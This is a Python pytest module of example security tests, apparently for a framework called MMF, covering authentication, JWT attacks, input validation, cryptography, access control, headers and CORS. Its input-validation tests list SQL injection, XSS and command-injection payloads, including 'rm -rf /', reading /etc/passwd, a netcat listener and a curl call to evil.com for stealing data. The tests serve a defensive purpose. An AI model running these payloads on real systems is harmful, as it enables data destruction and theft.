"""
Example Security Tests for MMF Framework

This module demonstrates security testing patterns using the MMF testing framework.
"""

import hashlib
import json
import secrets
import time
from dataclasses import dataclass
from typing import Any

import pytest


@dataclass
class SecurityTestResult:
    """Result of a security test."""

    test_name: str
    vulnerability_found: bool
    severity: str
    description: str
    remediation: str


@pytest.mark.security
class TestAuthenticationSecurity:
    """Security tests for authentication mechanisms."""

    async def test_password_strength_validation(self, security_validator):
        """Test password strength validation against common attacks."""
        weak_passwords = [
            "password",
            "123456",
            "qwerty",
            "admin",
            "password123",
            "letmein",
            "welcome",
            "monkey",
            "1234567890",
            "password1",
        ]

        strong_passwords = [
            "Tr0ub4dor&3",
            "correct horse battery staple",
            "MyP@ssw0rd!2023",
            "Sup3r$3cur3P@$$w0rd",
        ]

        # Test weak passwords are rejected
        for weak_password in weak_passwords:
            is_strong = await security_validator.validate_password_strength(weak_password)
            assert not is_strong, f"Weak password '{weak_password}' was accepted"

        # Test strong passwords are accepted
        for strong_password in strong_passwords:
            is_strong = await security_validator.validate_password_strength(strong_password)
            assert is_strong, f"Strong password '{strong_password}' was rejected"

    async def test_jwt_token_security(self, jwt_handler, security_test_vectors):
        """Test JWT token security against common vulnerabilities."""
        # Test 1: None algorithm vulnerability
        payload = {"user_id": 123, "role": "user"}

        # Create a token with 'none' algorithm (should be rejected)
        malicious_token = jwt_handler.create_token_with_algorithm(payload, "none")

        with pytest.raises(Exception, match="Algorithm.*not allowed"):
            await jwt_handler.verify_token(malicious_token)

        # Test 2: Algorithm confusion attack
        # Try to use HS256 token with RS256 public key
        hs256_token = jwt_handler.create_hs256_token(payload, "secret")

        with pytest.raises(Exception, match="Invalid.*signature"):
            await jwt_handler.verify_rs256_token(hs256_token)

        # Test 3: Token expiration
        expired_token = jwt_handler.create_expired_token(payload)

        with pytest.raises(Exception, match="Token.*expired"):
            await jwt_handler.verify_token(expired_token)

        # Test 4: Token tampering
        valid_token = jwt_handler.create_token(payload)
        tampered_token = valid_token[:-5] + "AAAAA"  # Modify signature

        with pytest.raises(Exception, match="Invalid.*signature"):
            await jwt_handler.verify_token(tampered_token)

    async def test_session_security(self, session_manager):
        """Test session management security."""
        user_id = "test_user_123"

        # Test session creation
        session_id = await session_manager.create_session(user_id)
        assert len(session_id) >= 32, "Session ID too short"
        assert session_id.isalnum(), "Session ID should be alphanumeric"

        # Test session validation
        is_valid = await session_manager.validate_session(session_id)
        assert is_valid, "Valid session was rejected"

        # Test session expiration
        await session_manager.expire_session(session_id)
        is_valid = await session_manager.validate_session(session_id)
        assert not is_valid, "Expired session was accepted"

        # Test session hijacking protection
        fake_session_id = "malicious_session_id"
        is_valid = await session_manager.validate_session(fake_session_id)
        assert not is_valid, "Fake session ID was accepted"


@pytest.mark.security
class TestInputValidationSecurity:
    """Security tests for input validation and sanitization."""

    async def test_sql_injection_protection(self, database_service):
        """Test protection against SQL injection attacks."""
        injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; UPDATE users SET admin=1; --",
            "' UNION SELECT password FROM users WHERE '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        ]

        for payload in injection_payloads:
            # Try injection in username field
            with pytest.raises(Exception, match="Invalid.*input|SQL.*injection"):
                await database_service.authenticate_user(payload, "password")

            # Try injection in search query
            with pytest.raises(Exception, match="Invalid.*input|SQL.*injection"):
                await database_service.search_users(payload)

    async def test_xss_protection(self, web_service):
        """Test protection against Cross-Site Scripting (XSS) attacks."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//",
            "\";alert('XSS');//",
        ]

        for payload in xss_payloads:
            # Test HTML sanitization
            sanitized = await web_service.sanitize_html(payload)
            assert "<script>" not in sanitized.lower()
            assert "javascript:" not in sanitized.lower()
            assert "onerror" not in sanitized.lower()
            assert "onload" not in sanitized.lower()

            # Test URL parameter sanitization
            sanitized_url = await web_service.sanitize_url_param(payload)
            assert "script" not in sanitized_url.lower()
            assert "javascript" not in sanitized_url.lower()

    async def test_command_injection_protection(self, system_service):
        """Test protection against command injection attacks."""
        injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "`whoami`",
            "$(cat /etc/hosts)",
            "; nc -l 4444",
            "| curl evil.com/steal-data",
        ]

        for payload in injection_payloads:
            # Test file operation with malicious input
            with pytest.raises(Exception, match="Invalid.*characters|Command.*injection"):
                await system_service.process_file(f"data{payload}.txt")

            # Test system command with malicious input
            with pytest.raises(Exception, match="Invalid.*characters|Command.*injection"):
                await system_service.execute_user_command(f"ls {payload}")


@pytest.mark.security
class TestCryptographicSecurity:
    """Security tests for cryptographic implementations."""

    async def test_password_hashing_security(self, crypto_service):
        """Test password hashing security."""
        password = "test_password_123"

        # Test hash generation
        hash1 = await crypto_service.hash_password(password)
        hash2 = await crypto_service.hash_password(password)

        # Hashes should be different (salt should be unique)
        assert hash1 != hash2, "Password hashes should be different due to salt"

        # Both hashes should verify correctly
        assert await crypto_service.verify_password(password, hash1)
        assert await crypto_service.verify_password(password, hash2)

        # Wrong password should fail verification
        assert not await crypto_service.verify_password("wrong_password", hash1)

        # Test hash strength (should use strong algorithm like bcrypt, scrypt, or argon2)
        assert len(hash1) >= 60, "Hash should be at least 60 characters (bcrypt)"
        assert hash1.startswith(("$2b$", "$scrypt$", "$argon2")), (
            "Should use strong hashing algorithm"
        )

    async def test_encryption_security(self, crypto_service):
        """Test encryption/decryption security."""
        plaintext = "Sensitive data that needs protection"

        # Test encryption
        encrypted = await crypto_service.encrypt(plaintext)
        assert encrypted != plaintext, "Encrypted data should be different from plaintext"
        assert len(encrypted) > len(plaintext), "Encrypted data should be longer (includes IV/salt)"

        # Test decryption
        decrypted = await crypto_service.decrypt(encrypted)
        assert decrypted == plaintext, "Decrypted data should match original"

        # Test encryption is non-deterministic (different ciphertexts for same plaintext)
        encrypted2 = await crypto_service.encrypt(plaintext)
        assert encrypted != encrypted2, "Encryption should be non-deterministic"

        # Both should decrypt to same plaintext
        decrypted2 = await crypto_service.decrypt(encrypted2)
        assert decrypted2 == plaintext

    async def test_random_number_generation(self, crypto_service):
        """Test cryptographically secure random number generation."""
        # Generate multiple random values
        random_values = []
        for _ in range(100):
            random_val = await crypto_service.generate_secure_random(32)
            random_values.append(random_val)

        # Test uniqueness
        unique_values = set(random_values)
        assert len(unique_values) == len(random_values), "Random values should be unique"

        # Test length
        for val in random_values:
            assert len(val) == 32, "Random value should have requested length"

        # Test entropy (basic test - values should not follow obvious patterns)
        concatenated = "".join(random_values)
        char_frequencies = {}
        for char in concatenated:
            char_frequencies[char] = char_frequencies.get(char, 0) + 1

        # Check that no character appears too frequently (indicates poor entropy)
        max_frequency = max(char_frequencies.values())
        total_chars = len(concatenated)
        max_expected_frequency = total_chars / 16 * 1.5  # Allow 50% deviation from uniform

        assert max_frequency < max_expected_frequency, "Random data shows poor entropy distribution"


@pytest.mark.security
class TestAuthorizationSecurity:
    """Security tests for authorization and access control."""

    async def test_rbac_security(self, auth_service):
        """Test Role-Based Access Control (RBAC) security."""
        # Create test users with different roles
        admin_user = await auth_service.create_user("admin", ["admin", "user"])
        regular_user = await auth_service.create_user("user", ["user"])
        guest_user = await auth_service.create_user("guest", ["guest"])

        # Test admin access
        assert await auth_service.check_permission(admin_user, "admin:read")
        assert await auth_service.check_permission(admin_user, "admin:write")
        assert await auth_service.check_permission(admin_user, "user:read")

        # Test regular user access
        assert await auth_service.check_permission(regular_user, "user:read")
        assert not await auth_service.check_permission(regular_user, "admin:read")
        assert not await auth_service.check_permission(regular_user, "admin:write")

        # Test guest access
        assert not await auth_service.check_permission(guest_user, "user:read")
        assert not await auth_service.check_permission(guest_user, "admin:read")

        # Test privilege escalation protection
        with pytest.raises(Exception, match="Unauthorized|Forbidden"):
            await auth_service.elevate_privileges(regular_user, ["admin"])

    async def test_resource_access_control(self, resource_service):
        """Test resource-level access control."""
        # Create test resources with different owners
        user1 = await resource_service.create_user("user1")
        user2 = await resource_service.create_user("user2")

        resource1 = await resource_service.create_resource("resource1", owner=user1)
        resource2 = await resource_service.create_resource("resource2", owner=user2)

        # Test owner access
        assert await resource_service.can_access(user1, resource1, "read")
        assert await resource_service.can_access(user1, resource1, "write")
        assert await resource_service.can_access(user2, resource2, "read")
        assert await resource_service.can_access(user2, resource2, "write")

        # Test unauthorized access
        assert not await resource_service.can_access(user1, resource2, "read")
        assert not await resource_service.can_access(user1, resource2, "write")
        assert not await resource_service.can_access(user2, resource1, "read")
        assert not await resource_service.can_access(user2, resource1, "write")

        # Test resource sharing
        await resource_service.share_resource(resource1, user2, ["read"])
        assert await resource_service.can_access(user2, resource1, "read")
        assert not await resource_service.can_access(user2, resource1, "write")


@pytest.mark.security
@pytest.mark.slow
class TestSecurityScanning:
    """Automated security scanning tests."""

    async def test_dependency_vulnerability_scan(self, vulnerability_scanner):
        """Test for known vulnerabilities in dependencies."""
        scan_results = await vulnerability_scanner.scan_dependencies()

        high_severity_vulns = [
            vuln for vuln in scan_results if vuln.severity in ["HIGH", "CRITICAL"]
        ]

        # Fail if high severity vulnerabilities are found
        if high_severity_vulns:
            vuln_details = "\n".join(
                [
                    f"- {vuln.package}: {vuln.vulnerability_id} ({vuln.severity})"
                    for vuln in high_severity_vulns
                ]
            )
            pytest.fail(f"High severity vulnerabilities found:\n{vuln_details}")

    async def test_secrets_detection(self, secrets_scanner):
        """Test for accidentally committed secrets."""
        scan_results = await secrets_scanner.scan_codebase()

        found_secrets = [
            result
            for result in scan_results
            if result.confidence > 0.8  # High confidence detections only
        ]

        if found_secrets:
            secret_details = "\n".join(
                [
                    f"- {secret.file_path}:{secret.line_number}: {secret.secret_type}"
                    for secret in found_secrets
                ]
            )
            pytest.fail(f"Potential secrets found in codebase:\n{secret_details}")

    async def test_code_security_analysis(self, static_analyzer):
        """Test for security issues in code using static analysis."""
        analysis_results = await static_analyzer.analyze_security()

        security_issues = [
            issue for issue in analysis_results if issue.severity in ["HIGH", "CRITICAL"]
        ]

        if security_issues:
            issue_details = "\n".join(
                [
                    f"- {issue.file_path}:{issue.line_number}: {issue.description}"
                    for issue in security_issues
                ]
            )
            pytest.fail(f"Security issues found in code:\n{issue_details}")


@pytest.mark.security
class TestSecurityHeaders:
    """Test security headers and configurations."""

    async def test_security_headers(self, web_client):
        """Test that security headers are properly configured."""
        response = await web_client.get("/api/health")

        # Test required security headers
        required_headers = {
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "X-XSS-Protection": "1; mode=block",
            "Strict-Transport-Security": "max-age=31536000; includeSubDomains",
            "Content-Security-Policy": lambda value: "default-src 'self'" in value,
            "Referrer-Policy": "strict-origin-when-cross-origin",
        }

        for header, expected_value in required_headers.items():
            assert header in response.headers, f"Missing security header: {header}"

            if callable(expected_value):
                assert expected_value(response.headers[header]), f"Invalid {header} value"
            else:
                assert response.headers[header] == expected_value, f"Invalid {header} value"

    async def test_cors_configuration(self, web_client):
        """Test CORS configuration security."""
        # Test preflight request
        response = await web_client.options(
            "/api/data",
            headers={
                "Origin": "https://evil.com",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "Content-Type",
            },
        )

        # Should not allow arbitrary origins
        if "Access-Control-Allow-Origin" in response.headers:
            allowed_origin = response.headers["Access-Control-Allow-Origin"]
            assert allowed_origin != "*", "CORS should not allow all origins"
            assert "evil.com" not in allowed_origin, "CORS should not allow malicious origins"

    async def test_cookie_security(self, web_client):
        """Test cookie security configuration."""
        # Login to get session cookie
        response = await web_client.post(
            "/api/auth/login", json={"username": "test_user", "password": "test_password"}
        )

        # Check session cookie security
        set_cookie = response.headers.get("Set-Cookie", "")

        assert "HttpOnly" in set_cookie, "Session cookie should be HttpOnly"
        assert "Secure" in set_cookie, "Session cookie should be Secure"
        assert "SameSite=Strict" in set_cookie, "Session cookie should use SameSite=Strict"
